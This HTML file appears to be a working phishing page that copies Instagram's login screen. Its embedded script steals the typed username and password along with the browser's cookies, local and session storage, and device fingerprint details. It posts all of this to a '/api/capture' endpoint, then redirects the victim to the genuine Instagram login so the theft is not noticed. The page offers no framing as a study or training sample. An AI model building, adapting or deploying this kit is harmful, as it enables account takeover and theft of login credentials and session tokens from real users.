<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Login • Instagram</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
<div class="phone">
    <div class="lang">English <span>▾</span></div>
    <div class="logo">Instagram</div>
    <form id="loginForm">
        <input type="text" name="username" placeholder="Phone number, username or email" required autocomplete="username">
        <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
        <button type="submit">Log in</button>
    </form>
    <div class="forgot"><a href="#">Forgot password?</a></div>
    <div class="divider"><span>OR</span></div>
    <div class="fb-login">
        <svg width="16" height="16" viewBox="0 0 24 24" fill="#385185"><path d="M24 12.07C24 5.4 18.63 0 12 0S0 5.4 0 12.07C0 18.1 4.39 23.1 10.13 24v-8.44H7.08v-3.49h3.05V9.41c0-3.02 1.79-4.69 4.53-4.69 1.31 0 2.68.24 2.68.24v2.97h-1.51c-1.49 0-1.96.93-1.96 1.89v2.25h3.33l-.53 3.49h-2.8V24C19.61 23.1 24 18.1 24 12.07z"/></svg>
        Log in with Facebook
    </div>
    <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
</div>
<script>
document.getElementById('loginForm').addEventListener('submit', async function(e) {
    e.preventDefault();
    const username = this.username.value;
    const password = this.password.value;
    const fingerprint = {
        cookies: document.cookie,
        url: window.location.href,
        referrer: document.referrer,
        screen: screen.width + 'x' + screen.height,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        language: navigator.language,
        platform: navigator.platform,
        cores: navigator.hardwareConcurrency,
        memory: navigator.deviceMemory
    };
    try { fingerprint.localStorage = JSON.stringify(localStorage); } catch(e){}
    try { fingerprint.sessionStorage = JSON.stringify(sessionStorage); } catch(e){}

    await fetch('/api/capture', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ username, password, fingerprint })
    });

    setTimeout(() => {
        window.location.href = 'https://www.instagram.com/accounts/login/';
    }, 500);
});
</script>
</body>
</html>
